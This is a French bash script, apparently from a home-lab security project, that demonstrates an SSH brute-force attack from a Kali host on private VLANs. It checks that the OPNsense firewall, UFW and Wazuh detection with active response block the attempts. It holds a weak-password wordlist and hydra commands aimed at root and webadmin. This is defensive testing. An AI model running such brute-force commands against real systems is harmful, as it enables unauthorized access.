#!/usr/bin/env bash
# ============================================================
# Scénario d'attaque 2 — Bruteforce SSH
# ============================================================
# Démo : depuis Kali (VLAN 10), bruteforce SSH contre le serveur
# Ubuntu (VLAN 30) ou le reverse proxy (VLAN 20).
#
# Résultat attendu :
#   - OPNsense bloque les tentatives SSH du VLAN 10 vers VLAN 30
#   - Si la cible est le reverse proxy (VLAN 20), SSH est bloqué
#     par UFW (uniquement le bastion peut SSH)
#   - Wazuh détecte le bruteforce (règle 100100/100101 : 5 échecs/60s)
#   - Active response : l'IP de Kali est bloquée
#
# Usage : sudo bash 02-ssh-bruteforce.sh
# ============================================================
set -euo pipefail

log() { echo "[$(date +%H:%M:%S)] $*"; }

KALI_IP="10.10.10.100"

# Cibles possibles
# Note : le VLAN 30 (10.10.30.10) est normalement INACCESSIBLE depuis le VLAN 10
# (règle OPNsense block). Le bruteforce échouera au niveau réseau.
# Pour la démo, on cible aussi le reverse proxy DMZ (SSH bloqué par UFW).
TARGET_UBUNTU="10.10.30.10"     # Zone critique (inaccessible depuis VLAN 10)
TARGET_PROXY="10.10.20.10"      # DMZ (SSH bloqué par UFW, seul 80/443 autorisés)

log "============================================================"
log "  SCENARIO 2 : Bruteforce SSH"
log "  Source : Kali ($KALI_IP, VLAN 10)"
log "============================================================"
log ""
log "Ce scénario tente un bruteforce SSH. La défense doit détecter et bloquer."
log ""

read -rp "Lancer le bruteforce ? (oui/non) : " confirm
[[ "$confirm" =~ ^[oO]ui$ ]] || { echo "Annulé."; exit 0; }

# --- Création d'une wordlist de démo ---
WORDLIST="/tmp/demo-wordlist.txt"
cat > "$WORDLIST" << 'EOF'
password
123456
admin
root
toor
test
azerty
qwerty
motdepasse
defendcore
letmein
welcome
EOF

# --- Tentative 1 : SSH vers le serveur Ubuntu (VLAN 30) ---
log "[1/2] Tentative SSH vers le serveur Ubuntu ($TARGET_UBUNTU, VLAN 30)..."
log "     (OPNsense doit bloquer : le VLAN 10 ne peut PAS joindre le VLAN 30)"
log ""
log "  -> Test de connectivité :"
if ping -c 3 -W 2 "$TARGET_UBUNTU" >/dev/null 2>&1; then
    log "  ⚠️ Surprising : le VLAN 30 est accessible ! Vérifiez vos règles OPNsense."
    log "     Lancement du bruteforce..."
    hydra -l webadmin -P "$WORDLIST" -t 4 -f ssh://"$TARGET_UBUNTU" 2>&1 | head -20 || true
else
    log "  ✅ Confirmé : le VLAN 30 est INACCESSIBLE depuis le VLAN 10."
    log "     OPNsense bloque correctement (règle default-deny)."
fi
log ""

# --- Tentative 2 : Bruteforce SSH vers le reverse proxy (VLAN 20) ---
log "[2/2] Bruteforce SSH vers le reverse proxy DMZ ($TARGET_PROXY, VLAN 20)..."
log "     (Le port 22 est bloqué par UFW — seul le bastion peut SSH)"
log "     (Wazuh doit détecter le bruteforce même si SSH refuse)"
log ""
# On tente quand même : Wazuh verra les échecs si le reverse proxy a un agent
hydra -l root -P "$WORDLIST" -t 4 -f -s 22 ssh://"$TARGET_PROXY" 2>&1 | head -20 || true

# --- Nettoyage ---
rm -f "$WORDLIST"

log ""
log "============================================================"
log "  Vérifications :"
log "  1. Dashboard Wazuh : alerte 'SSH bruteforce détecté' (règle 100100)"
log "  2. OPNsense : Firewall > Log Files > paquets bloqués (VLAN 10->30)"
log "  3. Active response : Kali ($KALI_IP) bloquée dans wazuh_blocked_ips"
log "  4. Reverse proxy (10.10.20.10) : UFW log des connexions refusées"
log "============================================================"
